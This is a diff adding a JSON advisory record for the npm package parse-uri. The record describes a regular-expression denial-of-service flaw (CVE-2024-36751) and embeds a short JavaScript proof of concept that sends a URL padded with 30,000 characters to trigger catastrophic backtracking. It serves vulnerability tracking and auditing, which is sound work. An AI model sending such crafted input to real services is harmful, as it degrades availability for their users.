@@ -1,0 +1,26 @@
+{
+  "name": "parseuri",
+  "lastUpdated": "2026-01-31T15:05:26.294Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-6fx8-h7jm-663j",
+      "title": "parse-uri Regular expression Denial of Service (ReDoS)",
+      "description": "An issue in parse-uri v1.0.9 allows attackers to cause a Regular expression Denial of Service (ReDoS) via a crafted URL.\n ## PoC\n```js\nasync function exploit() {\n    const parseuri = require(\"parse-uri\");\n    // This input is designed to cause excessive backtracking in the regex\n    const craftedInput = 'http://example.com/' + 'a'.repeat(30000) + '?key=value';\n    const result = await parseuri(craftedInput);\n    }\nawait exploit();\n```",
+      "severity": "medium",
+      "url": "https://github.com/advisories/GHSA-6fx8-h7jm-663j",
+      "publishedAt": "2025-01-16T00:31:22Z",
+      "modifiedAt": "2025-09-03T12:56:48Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-6fx8-h7jm-663j"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2024-36751"
+        }
+      ],
+      "affectedRange": "< 2.0.0"
+    }
+  ]
+}
